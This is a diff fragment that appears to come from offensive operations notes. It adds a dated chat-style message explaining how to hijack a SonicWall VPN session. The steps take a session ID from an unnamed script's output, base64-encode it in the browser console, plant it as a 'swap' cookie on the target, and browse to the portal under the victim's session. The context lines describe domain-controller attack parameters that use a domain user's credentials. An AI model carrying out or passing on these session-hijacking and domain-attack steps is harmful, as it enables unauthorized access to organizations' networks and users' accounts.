@@ -1448,3 +1448,21 @@ as you can see we do the same as in the normal attack, just add 3 new attributes
 /dc: - specify the domain controller
 /creduser: - login of the domain user from which we are running
 /credpassword: - password of the domain user from which we are running
+
+===================================
+
+Date: 2021-01-13T09:35:42.796Z
+From: alter
+Message: for those who need to work with SonicWall through browser sessions
+Using a Web Browser to Access
+```
+- take the session from the script output, for example "47ZjFKx24Nj2h0UtZKX2OYnZLgRg05aX2SuaotVzrQg="
+- open the browser in incognito mode, open the developer console (js-console)
+- encode the session ID in base64
+>> btoa("47ZjFKx24Nj2h0UtZKX2OYnZLgRg05aX2SuaotVzrQg=") [ENTER]
+"NDdaakZLeDI0TmoyaDBVdFpLWDJPWW5aTGdSZzA1YVgyU3Vhb3RWenJRZz0="
+- drive in the URL https://target (redirect to https://target/cgi-bin/welcome)
+- go to the console in application/cookies, add a cookie
+swap : NDdaakZLeDI0TmoyaDBVdFpLWDJPWW5aTGdSZzA1YVgyU3Vhb3RWenJRZz0=
+- in the browser (where .../cgi-bin/welcome) edit the URL to https://target/cgi-bin/portal
+- get access to the resource under the user session
